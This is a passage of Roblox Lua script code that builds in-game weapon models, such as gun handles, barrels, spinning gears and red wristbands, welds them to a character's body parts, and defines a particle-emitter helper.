Particle.ZOffset = 0.2
Particle.Rotation = NumberRange.new(-180, 180)
Particle.RotSpeed = NumberRange.new(-180, 180)
Particle.Texture = "http://www.roblox.com/asset/?id=304437537"
Particle.Color = ColorSequence.new(C3(1,0,0),C3(0.4,0,0))

--ParticleEmitter({Speed = 5, Drag = 0, Size1 = 1, Size2 = 5, Lifetime1 = 1, Lifetime2 = 1.5, Parent = Torso, Emit = 100, Offset = 360, Enabled = false})
function ParticleEmitter(Table)
	local PRTCL = Particle:Clone()
	local Speed = Table.Speed or 5
	local Drag = Table.Drag or 0
	local Size1 = Table.Size1 or 1
	local Size2 = Table.Size2 or 5
	local Lifetime1 = Table.Lifetime1 or 1
	local Lifetime2 = Table.Lifetime2 or 1.5
	local Parent = Table.Parent or Torso
	local Emit = Table.Emit or 100
	local Offset = Table.Offset or 360
	local Acel = Table.Acel or VT(0,0,0)
	local Enabled = Table.Enabled or false
	PRTCL.Parent = Parent
	PRTCL.Size = NumberSequence.new(Size1,Size2)
	PRTCL.Lifetime = NumberRange.new(Lifetime1,Lifetime2)
	PRTCL.Speed = NumberRange.new(Speed)
	PRTCL.VelocitySpread = Offset
	PRTCL.Drag = Drag
	PRTCL.Acceleration = Acel
	if Enabled == false then
		PRTCL:Emit(Emit)
		Debris:AddItem(PRTCL,Lifetime2)
	else
		PRTCL.Enabled = true
	end
	return PRTCL
end


local Handle = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.6,0.2),false)
local RightArmGrasp2 = CreateWeldOrSnapOrMotor("Weld", Handle, Torso, Handle, CF(-1.1,-1.1,0) * ANGLES(RAD(0), RAD(90), RAD(-90)), CF(0, 0.21, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.5,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.3, 0.2) * ANGLES(RAD(0), RAD(180), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.3,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.4, 0) * ANGLES(RAD(0), RAD(0), RAD(180)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.3,0.3),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.5, 0.2) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.5,0.5),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.5) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.4,0.4,0.4),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
for i = 1, 8 do
	local Piece = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Eye", VT(0,0.35,0.41),false)
	CreateWeldOrSnapOrMotor("Weld", Handle, Part, Piece, CF(0, 0, 0) * ANGLES(RAD(0), RAD((360/8)*i), RAD(0)), CF(0, 0, 0))
end
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Eye", VT(0.38,0.41,0.38),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.37,0.5,0.37),false)
MakeForm(Part,"Ball")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.3) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.7,0.4),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.7, 0.5) * ANGLES(RAD(90), RAD(180), RAD(180)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.4,0.2),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.35,0.35,0.35),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.5,0.1,0.5),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 1) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.5,0.1,0.45),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 1.1) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.5,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.55, 0.2) * ANGLES(RAD(-135), RAD(0), RAD(0)), CF(0, -0.3, 0))
local LASTPART = Handle
for i = 1, 10 do
	if LASTPART == Handle then
		local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.1,0.2,0),false)
		LASTPART = Part
		CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.1, 0.2) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
	else
		local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.1,0.05,0),false)
		CreateWeldOrSnapOrMotor("Weld", Handle, LASTPART, Part, CF(0, 0.025, 0) * ANGLES(RAD(8), RAD(0), RAD(0)), CF(0, -0.025, 0))
		LASTPART = Part
	end
end

local Barrel = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.15,2,0.15),false)
MakeForm(Barrel,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Barrel, CF(0, -0.6, 1.8) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0.25,1,0.25),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Barrel, Part, CF(0, -0.6, 0), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0,0.1,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Barrel, Part, CF(0, 0.945, 0.1) * ANGLES(RAD(180), RAD(0), RAD(0)), CF(0, 0, 0))
local Holee = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Eye", VT(0.125,0,0.125),false)
MakeForm(Holee,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Barrel, Holee, CF(0, 0.98, 0), CF(0, 0, 0))
local Part = CreatePart(3, BB, "Metal", 0, 0, "Mid gray", "Part", VT(0,0,0),false)
local GEARWELD = CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7), CF(0, 0, 0))
CreateMesh("SpecialMesh", Part, "FileMesh", 156292343, "", VT(0.8,0.8,1.5), VT(0,0,0.2))
local Part = CreatePart(3, BB, "Metal", 0, 0.5, "Mid gray", "Eye", VT(0,0,0),false)
local GEARWELD2 = CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7), CF(0, 0, 0))
CreateMesh("SpecialMesh", Part, "FileMesh", 156292343, "", VT(0.9,0.9,0.3), VT(0,0,0.2))
coroutine.resume(coroutine.create(function()
	while wait() do
		GEARWELD.C0 = GEARWELD.C0 * ANGLES(RAD(0), RAD(8), RAD(5))
		GEARWELD2.C0 = GEARWELD2.C0 * ANGLES(RAD(0), RAD(-8), RAD(-5))
	end
end))

-------

local Handle = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.6,0.2),false)
local RightArmGrasp = CreateWeldOrSnapOrMotor("Weld", Handle, RightArm, Handle, CF(0,-1, 0) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0.21, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.5,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.3, 0.2) * ANGLES(RAD(0), RAD(180), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.3,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.4, 0) * ANGLES(RAD(0), RAD(0), RAD(180)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.3,0.3),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.5, 0.2) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.5,0.5),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.5) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.4,0.4,0.4),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
for i = 1, 8 do
	local Piece = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Eye", VT(0,0.35,0.41),false)
	CreateWeldOrSnapOrMotor("Weld", Handle, Part, Piece, CF(0, 0, 0) * ANGLES(RAD(0), RAD((360/8)*i), RAD(0)), CF(0, 0, 0))
end
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Eye", VT(0.38,0.41,0.38),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.37,0.5,0.37),false)
MakeForm(Part,"Ball")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.3) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.7,0.4),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.7, 0.5) * ANGLES(RAD(90), RAD(180), RAD(180)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.4,0.2),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.35,0.35,0.35),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.5,0.1,0.5),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 1) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.5,0.1,0.45),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 1.1) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.5,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.55, 0.2) * ANGLES(RAD(-135), RAD(0), RAD(0)), CF(0, -0.3, 0))
local LASTPART = Handle
for i = 1, 10 do
	if LASTPART == Handle then
		local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.1,0.2,0),false)
		LASTPART = Part
		CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.1, 0.2) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
	else
		local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.1,0.05,0),false)
		CreateWeldOrSnapOrMotor("Weld", Handle, LASTPART, Part, CF(0, 0.025, 0) * ANGLES(RAD(8), RAD(0), RAD(0)), CF(0, -0.025, 0))
		LASTPART = Part
	end
end

local Barrel = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.15,2,0.15),false)
MakeForm(Barrel,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Barrel, CF(0, -0.6, 1.8) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.25,1,0.25),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Barrel, Part, CF(0, -0.6, 0), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0,0.1,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Barrel, Part, CF(0, 0.945, 0.1) * ANGLES(RAD(180), RAD(0), RAD(0)), CF(0, 0, 0))
local Hole = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Eye", VT(0.125,0,0.125),false)
MakeForm(Hole,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Barrel, Hole, CF(0, 0.98, 0), CF(0, 0, 0))
local Part = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0,0,0),false)
local GEARWELD = CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7), CF(0, 0, 0))
CreateMesh("SpecialMesh", Part, "FileMesh", 156292343, "", VT(0.8,0.8,1.5), VT(0,0,0.2))
local Part = CreatePart(3, Weapon, "Metal", 0, 0.5, "Mid gray", "Eye", VT(0,0,0),false)
local GEARWELD2 = CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.6, 0.7), CF(0, 0, 0))
CreateMesh("SpecialMesh", Part, "FileMesh", 156292343, "", VT(0.9,0.9,0.3), VT(0,0,0.2))
coroutine.resume(coroutine.create(function()
	while wait() do
		GEARWELD.C0 = GEARWELD.C0 * ANGLES(RAD(0), RAD(0), RAD(5))
		GEARWELD2.C0 = GEARWELD2.C0 * ANGLES(RAD(0), RAD(0), RAD(-5))
	end
end))

local Handle = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,1.2,0.2),false)
local LeftArmGraps = CreateWeldOrSnapOrMotor("Weld", Handle, Torso, Handle, CF(-1.2,0.2,0.1) * ANGLES(RAD(90), RAD(50), RAD(150)), CF(0, 0.3, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.8,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, 0.2, 0.2) * ANGLES(RAD(0), RAD(180), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.5,0.6),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.5, 0.4) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.4,0.4,0.4),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.45, 0.4) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
for i = 1, 8 do
	local Piece = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Eye", VT(0,0.35,0.41),false)
	CreateWeldOrSnapOrMotor("Weld", Handle, Part, Piece, CF(0, 0, 0) * ANGLES(RAD(0), RAD((360/8)*i), RAD(0)), CF(0, 0, 0))
end
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.5,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.55, 0.2) * ANGLES(RAD(-135), RAD(0), RAD(0)), CF(0, -0.3, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Eye", VT(0.39,0.41,0.39),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.45, 0.4) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.5,0.5),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.5, 0.2) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.4,0.5),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.55, 0.65) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0,0.6),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, 0, 0) * ANGLES(RAD(45), RAD(0), RAD(0)), CF(0, -0.2, -0.3))
local LeftBarrel = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.28,5,0.28),false)
MakeForm(LeftBarrel,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, LeftBarrel, CF(0, -0.6, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, -2.5, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0,0.2,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, LeftBarrel, Part, CF(0, 2.415, 0.15) * ANGLES(RAD(180), RAD(0), RAD(0)), CF(0, 0, 0))
local LeftHole2 = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Eye", VT(0.2,0,0.2),false)
MakeForm(LeftHole2,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, LeftBarrel, LeftHole2, CF(0, 2.5, 0), CF(0, 0, 0))
local Eye = CreatePart(3, Dead, "Neon", 0, 0, "Really red", "Eye", VT(0.6,0.1,1)/2,false)

---
local Handle = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,1.2,0.2),false)
local LeftArmGraps2 = CreateWeldOrSnapOrMotor("Weld", Handle, Torso, Handle, CF(1.2,0.2,0.1) * ANGLES(RAD(90), RAD(-50), RAD(-150)), CF(0, 0.3, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.8,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, 0.2, 0.2) * ANGLES(RAD(0), RAD(180), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.5,0.6),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.5, 0.4) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.4,0.4,0.4),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.45, 0.4) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
for i = 1, 8 do
	local Piece = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Eye", VT(0,0.35,0.41),false)
	CreateWeldOrSnapOrMotor("Weld", Handle, Part, Piece, CF(0, 0, 0) * ANGLES(RAD(0), RAD((360/8)*i), RAD(0)), CF(0, 0, 0))
end
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0.5,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.55, 0.2) * ANGLES(RAD(-135), RAD(0), RAD(0)), CF(0, -0.3, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Eye", VT(0.39,0.41,0.39),false)
MakeForm(Part,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.45, 0.4) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.5,0.5),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.5, 0.2) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.3,0.4,0.5),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, -0.55, 0.65) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,0,0.6),false)
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, Part, CF(0, 0, 0) * ANGLES(RAD(45), RAD(0), RAD(0)), CF(0, -0.2, -0.3))
local LeftBarrel = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0.28,5,0.28),false)
MakeForm(LeftBarrel,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, Handle, LeftBarrel, CF(0, -0.6, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, -2.5, 0))
local Part = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Part", VT(0,0.2,0.2),false)
MakeForm(Part,"Wedge")
CreateWeldOrSnapOrMotor("Weld", Handle, LeftBarrel, Part, CF(0, 2.415, 0.15) * ANGLES(RAD(180), RAD(0), RAD(0)), CF(0, 0, 0))
local LeftHole = CreatePart(3, Dead, "Metal", 0, 0, "Mid gray", "Eye", VT(0.2,0,0.2),false)
MakeForm(LeftHole,"Cyl")
CreateWeldOrSnapOrMotor("Weld", Handle, LeftBarrel, LeftHole, CF(0, 2.5, 0), CF(0, 0, 0))
local Eye = CreatePart(3, Dead, "Neon", 0, 0, "Really red", "Eye", VT(0.6,0.1,1)/2,false)
--

----2

local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Really red", "Wistband part", VT(1.010,1.10,1.010),false)
local Caac = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0, 0.2, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))


local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Really red", "Wistband part", VT(1.010,1.10,1.010),false)
local Caac = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0, 0.2, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))


local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Really red", "Wistband part", VT(1.015,1.15,1.015),false)
local Caac = CreateWeldOrSnapOrMotor("Weld", part, RightLeg, part, CF(0, -0.1, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Really red", "Wistband part", VT(1.015,1.15,1.015),false)
local Caac = CreateWeldOrSnapOrMotor("Weld", part, LeftLeg, part, CF(0, -0.1, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Fabric", 0, 0, "Really red", "Wistband part", VT(0.5,1.15,0.5),false)
local Caac = CreateWeldOrSnapOrMotor("Weld", part, Torso, part, CF(0, -0.1, 1) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(1.015,0.15,1.015),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0, -0.1, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(1.015,0.15,1.015),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0, -0.1, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(1.015,0.15,1.015),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0, 0.9, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(1.015,0.15,1.015),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0, 0.9, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(1.015,0.15,1.015),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0, -0.3, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Black", "Wistband part", VT(1.035,0.1,1.035),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0, -0.35, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Black", "Wistband part", VT(1.035,0.1,1.035),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0, -0.45, 0) * ANGLES(RAD(0), RAD(180), RAD(180)) * ANGLES(RAD(0), RAD(90), RAD(0)), CF(0, 0, 0))
MakeForm(part,"Wedge")
local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(0,1.5,0),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(-0.5, 0.2, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(0,1.5,0),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, LeftArm, part, CF(0.5, 0.2, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))

----2

local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(1.015,0.15,1.015),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0, -0.3, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Black", "Wistband part", VT(1.035,0.1,1.035),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0, -0.35, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local part = CreatePart(3, Weapon2, "Granite", 0, 0, "Black", "Wistband part", VT(1.035,0.1,1.035),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0, -0.45, 0) * ANGLES(RAD(0), RAD(180), RAD(180)) * ANGLES(RAD(0), RAD(90), RAD(0)), CF(0, 0, 0))
MakeForm(part,"Wedge")
local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(0,1.5,0),false)
local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(0.5, 0.2, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))
local part = CreatePart(3, Weapon2, "Neon", 0, 0, "Really red", "Wistband part", VT(0,1.5,0),false)
